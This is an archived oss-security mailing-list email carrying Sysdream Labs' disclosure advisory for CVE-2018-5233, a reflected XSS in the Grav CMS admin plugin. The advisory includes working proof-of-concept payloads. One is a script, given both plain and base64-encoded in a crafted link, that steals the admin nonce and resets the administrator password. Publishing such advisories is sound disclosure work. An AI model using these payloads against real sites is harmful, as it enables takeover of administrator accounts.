X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["5780" "Thursday" "15" "March" "2018" "10:46:12" "+0100" "Sydream Labs" "labs@sysdream.com" "<21d7c459-7914-7c43-2c0a-b16085a94f2f@sysdream.com>" "191" "[oss-security] [CVE-2018-5233] Grav CMS admin plugin Reflected Cross Site Scripting (XSS) vulnerability" nil nil nil "3" "2018031509:46:12" "[oss-security] [CVE-2018-5233] Grav CMS admin plugin Reflected Cross Site Scripting (XSS) vulnerability" (number mark "U       labs@sysdrea Mar 15  191/5780  " thread-indent "\"[oss-security] [CVE-2018-5233] Grav CMS admin plugin Reflected Cross Site Scripting (XSS) vulnerability\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 1999 invoked by uid 550); 15 Mar 2018 09:46:38 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 1977 invoked from network); 15 Mar 2018 09:46:37 -0000
DKIM-Filter: OpenDKIM Filter v2.9.2 mail.sysdream.com E03171A0C91
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=sysdream.com;
	s=FEF1D5FC-BC6A-11E6-98AA-27E162F08D53; t=1521107173;
	bh=6AxML99+9xa2+Y8glrKmqrm9Ea9F7He3Iwg+T4Inpos=;
	h=To:From:Subject:Message-ID:Date:MIME-Version:Content-Type;
	b=dW9q5cFwYaq8h5t3TXpJM7rRdNlSwWSlh7S7DUrKXUMVer5NiGVlHeMornvWOgusy
	 GSanET24lWCltlMTDn17vvgteGYnEXF5R54vgTmqykLGESSbumypMx6bdbB2W6TX9/
	 AmHXINrgPmFtJKdwAKv7M2jWtaErPu6Gl+O9vvJQ=
X-Virus-Scanned: amavisd-new at sysdream.com
To: fulldisclosure@seclists.org, oss-security@lists.openwall.com
From: Sydream Labs <labs@sysdream.com>
Message-ID: <21d7c459-7914-7c43-2c0a-b16085a94f2f@sysdream.com>
Date: Thu, 15 Mar 2018 10:46:12 +0100
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101
 Thunderbird/52.6.0
MIME-Version: 1.0
Content-Type: multipart/signed; micalg=pgp-sha256;
 protocol="application/pgp-signature";
 boundary="sBt8amvoXX8hRRzzv9oep9hkXyGk9JRPX"
Subject: [oss-security] [CVE-2018-5233] Grav CMS admin plugin Reflected Cross Site Scripting
 (XSS) vulnerability

--sBt8amvoXX8hRRzzv9oep9hkXyGk9JRPX
Content-Type: multipart/mixed; boundary="EdTALiZ8P1nzoao3bCNCp1C7diBobuwvq";
 protected-headers="v1"
From: Sydream Labs <labs@sysdream.com>
To: fulldisclosure@seclists.org, oss-security@lists.openwall.com
Message-ID: <21d7c459-7914-7c43-2c0a-b16085a94f2f@sysdream.com>
Subject: [CVE-2018-5233] Grav CMS admin plugin Reflected Cross Site Scripting
 (XSS) vulnerability

--EdTALiZ8P1nzoao3bCNCp1C7diBobuwvq
Content-Type: text/plain; charset=utf-8
Content-Language: fr
Content-Transfer-Encoding: quoted-printable

# [CVE-2018-5233] Grav CMS admin plugin Reflected Cross Site Scripting
(XSS) vulnerability

## Description

Grav CMS is a flat-file CMS using Markdown files for content management
([Official Website](https://getgrav.org/)).

It has been elected "Best Open Source CMS of 2016" by [CMS
critic](https://www.cmscritic.com/the-winner-of-best-open-source-cms-for-20=
16-is-grav/).

The application does not always filter user input correctly, thereby
allowing an attacker to inject arbitrary Web content in the response of
the server (reflected Cross Site Scripting).

**CVE ID**: CVE-2018-5233

**Access Vector**: remote

**Security Risk**: high

**Vulnerability**: CWE-79

**CVSS Base Score**: 7.4

**CVSS Vector String**: CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:N/A:N


## Details

On lines 355 and 358 of `system/src/Grav/Common/Twig/Twig.php`,
unfiltered user input is passed in the `$error_msg` variable.

```
$output =3D $this->twig->render($template, $twig_vars);
} catch (\Twig_Error_Loader $e) {

.. snip ..

            throw new \RuntimeException($error_msg, 400, $e);
        }
    } else {
        throw new \RuntimeException($error_msg, 400, $e);
    }
}
```

As a result, generating an exception by accessing
`/admin/tools/someunexistingpage` and manipulating the
`someunexistingpage` part of the URL allows to inject arbitrary Web
content into the server's response.

## Proof of Concept #1

Visiting the following page:

```
/admin/tools/a--%3E%3Cimg%20src=3Dx%20onerror=3Dalert(1)%3E
```

will cause the execution of the `alert(1)` JavaScript code in the
context of the visitor's browser.

## Proof of Concept #2

By tricking a logged-in admin into visiting a malicious link, any
unauthenticated user can elevate its privileges to site administration.

Here follows a Proof of Concept code which:

1. Grabs the `admin-nonce` of the logged-in admin
2. Prints that nonce
3. Uses it to change the current admin's password to `Password7`

```
<script
src=3D"https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></=
script>

<script>
adminNonce =3D "";
$.get( "/admin/user/admin",
function( data ) {adminNonce =3D $("input[name=3Dadmin-nonce]",
data).val()}).done(
function(){
alert(window.adminNonce);
$.post( "/admin/user/admin", {
    "task": "save",
        "admin-nonce": adminNonce,
    "data[password]": "Password7"},
    function(data){document.write(data)})}
);
</script>
```

Here is the base64 encoded version of the payload, injected in the
malicious link:

```
http://example.site.com/admin/tools/a--%3E%3Cimg%20src=3Dx%20onerror=3Ddocu=
ment['write'](atob('PHNjcmlwdCBzcmM9Imh0dHBzOi8vYWpheC5nb29nbGVhcGlzLmNvbS9=
hamF4L2xpYnMvanF1ZXJ5LzMuMi4xL2pxdWVyeS5taW4uanMiPjwvc2NyaXB0PjxzY3JpcHQ+YW=
RtaW5Ob25jZSA9ICIiOyQuZ2V0KCAiL2FkbWluL3VzZXIvYWRtaW4iLCBmdW5jdGlvbiggZGF0Y=
SApIHthZG1pbk5vbmNlID0gJCgiaW5wdXRbbmFtZT1hZG1pbi1ub25jZV0iLCBkYXRhKS52YWwo=
KX0pLmRvbmUoZnVuY3Rpb24oKXthbGVydCh3aW5kb3cuYWRtaW5Ob25jZSk7JC5wb3N0KCAiL2F=
kbWluL3VzZXIvYWRtaW4iLCB7ICJ0YXNrIjogInNhdmUiLCAiYWRtaW4tbm9uY2UiOiBhZG1pbk=
5vbmNlLCJkYXRhW3Bhc3N3b3JkXSI6ICJQYXNzd29yZDcifSwgZnVuY3Rpb24oZGF0YSl7ZG9jd=
W1lbnQud3JpdGUoZGF0YSl9KX0pOzwvc2NyaXB0Pgo=3D'))%3E
```

Now, after the attacker tricks a logged-in admin into clicking on this
link, the admin's password is changed to the attacker controlled value.
Thus, the attacker can log in with `Password7` and navigate inside the
administration interface.


## Timeline (dd/mm/yyyy)

* 01/07/2017 : Initial discovery
* 01/07/2017 : Contact with the editor (email address)
* 02/07/2017 : Editor acknowledges the report
* 02/07/2017 : Sending further details and PoC code to the editor
* 04/07/2017 : Editor fixes the vulnerability
* 15/03/2018 : Advisory publication

## Fixes

Upgrade to version 1.3.0 and above (currently 1.3.10)

## Affected versions

* Version 1.2.4 (last stable version as of 02/07/2017 - previous
versions are probably also vulnerable but not tested)

## Credits

* Kevin LOCATI <k.locati@sysdream.com>


--=20
SYSDREAM Labs <labs@sysdream.com>

GPG :
47D1 E124 C43E F992 2A2E
1551 8EB4 8CD9 D5B2 59A1

* Website: https://sysdream.com/
* Twitter: @sysdream


--EdTALiZ8P1nzoao3bCNCp1C7diBobuwvq--

--sBt8amvoXX8hRRzzv9oep9hkXyGk9JRPX
Content-Type: application/pgp-signature; name="signature.asc"
Content-Description: OpenPGP digital signature
Content-Disposition: attachment; filename="signature.asc"

-----BEGIN PGP SIGNATURE-----
Version: GnuPG v2

iQIcBAEBCAAGBQJaqkDkAAoJEI60jNnVslmhKDwP/ieW6gl3LcrTADt3nh4F+p6m
3Uh1jqJaSGotRMWBEijA7Id690yLXdtez3D/VdDqZ4eYl+00kfWjBrjYNpO/dq5L
wxLOdx902/M5lWdEV2jSMlcGacd3sEkztNz0Wn7h0qX1gkCbHGLlHtjI0pEYtIYX
Gfo9SJ94NqKtc/4Hn3BbXWGc4j9TJVyzdRGsuoQtn3Q3203TwOesnFMA8989j76Z
06UUfkHuckpBm4Wu8tQiagpS4ezm1spr88Nud4+jPSGARe6y5dDPKsssKXxAqnZD
ckhBRgAoZH25cCt38f2P8tpeqikjnwzIy4rh/1qTNgb2trrjd7za0Z2YTjKTgGL5
wHmwbRY/NfYhWju2PGf7N8AvNh/9Jsv2mj5gPkLwpVivOwNhOS2BwZbJ+uC2FI4R
LmShJx+RHbOsyUxyhJitKT9wnVxtn/1AqlTq8+cez1V8ab2unNR0JXGNYLmlKvWN
UhxvgaIvXBR8ymBffiKcUHG1XMkaGFSt6WoJEhoZvg4koDy9ghXtMbzLJi+KiOV7
RfZYBP02d/F5oA7uhNNrJDllUtqUiXdYNdm0fCBmyC56APFULZ74r76CL+bxlYa/
G3mge+MkrLYh5OznA3Wpb54VpDAtc1wqwZDahjKed0CEeegy0Jzl+Zi1j2jGJ/Wn
WMFiBuj3OMHHfZA7WM26
=0X/f
-----END PGP SIGNATURE-----

--sBt8amvoXX8hRRzzv9oep9hkXyGk9JRPX--
